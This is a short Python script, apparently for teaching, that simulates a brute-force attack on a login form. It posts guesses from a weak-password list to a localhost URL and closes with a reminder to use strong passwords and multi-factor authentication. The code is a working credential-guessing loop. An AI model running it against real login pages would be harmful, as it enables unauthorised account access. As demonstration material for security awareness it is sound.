import requests
import time

def simulate_brute_force(url, username, password_list):
  """
  Simulates a brute-force attack on a login form, demonstrating inefficiency for weak passwords.

  Args:
      url (str): The URL of the login form (replace with your controlled environment URL).
      username (str): The username to use for the login attempts.
      password_list (list): A list of passwords to try.

  Prints:
      None. Prints messages indicating successful login or number of attempts made with elapsed time.
  """
  start_time = time.time()
  for password in password_list:
    data = {"username": username, "password": password}
    response = requests.post(url, data=data)
    if "Login successful" in response.text:  # Replace with actual success indicator
      print(f"Password Cracked! It was: {password}")
      elapsed_time = time.time() - start_time
      print(f"Brute-force attack completed in {elapsed_time:.2f} seconds.")
      return
    # Simulate a delay between attempts to avoid overwhelming the server (controlled environment)
    time.sleep(0.1)  # Adjust delay as needed
  elapsed_time = time.time() - start_time
  print(f"Attack failed. None of the passwords in the list matched.")
  print(f"Number of attempts made: {len(password_list)}")
  print(f"Brute-force attempt took {elapsed_time:.2f} seconds (for demonstration purposes).")

# Sample login details (replace with a sample login form URL within your controlled environment)
login_url = "http://localhost/sample_login"  # Replace with your controlled environment URL
username = "admin"

# Weak password list (for demonstration purposes only)
weak_password_list = ["password123", "admin123", "qwerty", "123456"]

# Simulate brute-force attack with the weak password list
simulate_brute_force(login_url, username, weak_password_list)

print("** Remember to use strong passwords and enable Multi-Factor Authentication for better security!**")
